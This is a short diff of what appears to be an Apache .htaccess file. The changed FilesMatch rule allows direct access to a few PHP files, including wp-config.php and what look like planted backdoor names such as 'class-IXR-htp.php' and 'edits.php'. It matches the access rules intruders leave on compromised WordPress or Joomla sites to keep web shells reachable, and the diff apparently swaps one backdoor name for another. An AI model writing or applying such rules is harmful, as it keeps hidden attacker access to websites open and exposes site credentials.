@@ -38,7 +38,7 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<FilesMatch "^(thread.php|index.php|wp-config.php|configuration.php|class-IXR-htp.php)$">
+<FilesMatch "^(thread.php|index.php|wp-config.php|configuration.php|edits.php)$">
     Order allow,deny
     Allow from all
 </FilesMatch>
